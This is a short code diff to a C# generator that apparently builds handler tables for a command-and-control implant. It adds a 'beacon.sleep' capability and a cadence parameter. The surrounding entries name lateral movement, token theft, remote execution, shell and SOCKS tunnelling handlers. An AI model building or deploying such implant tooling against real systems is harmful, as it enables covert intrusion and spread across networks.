@@ -66,6 +66,9 @@ public static class HandlerModuleSelection
         new("Internal/Proc.cs",
             new[] { "proc.kill", "recon.ps" },
             Array.Empty<string>()),
+        new("Internal/BeaconSleep.cs",
+            new[] { "beacon.sleep" },
+            Array.Empty<string>()),
         new("Internal/Lateral.cs",
             new[] { "lateral.move", "lateral.token", "lateral.exec_remote" },
             Array.Empty<string>()),
@@ -105,6 +108,7 @@ public static class HandlerModuleSelection
         ("shell.exec", "new CapabilityHandler(\"shell.exec\", args => Core.ShellExec(args)),"),
         ("shell.interact", "new CapabilityHandler(\"shell.interact\", _ =>\n"
             + "            (TaskOutcome.Failed, \"shell.interact runs as a live channel; this dispatch path does not carry one\")),"),
+        ("beacon.sleep", "new CapabilityHandler(\"beacon.sleep\", args => BeaconSleep.Set(args, cadence)),"),
         ("tunnel.forward", "new CapabilityHandler(\"tunnel.forward\", _ =>\n"
             + "            (TaskOutcome.Failed, \"tunnel.forward runs as a live channel; this dispatch path does not carry one\")),"),
         ("tunnel.socks", "new CapabilityHandler(\"tunnel.socks\", _ =>\n"
@@ -276,7 +280,7 @@ public static class HandlerModuleSelection
           .Append("namespace Rod.Implant.Internal;\n\n")
           .Append("internal static class HandlerSelection\n")
           .Append("{\n")
-          .Append("    public static IReadOnlyList<ICapabilityHandler> Handlers(EnrollBundle? enroll) =>\n")
+          .Append("    public static IReadOnlyList<ICapabilityHandler> Handlers(EnrollBundle? enroll, Cadence? cadence = null) =>\n")
           .Append("    [\n");
         AppendFragments(sb, OneShotFragments, permitted);
         sb.Append("    ];\n\n")
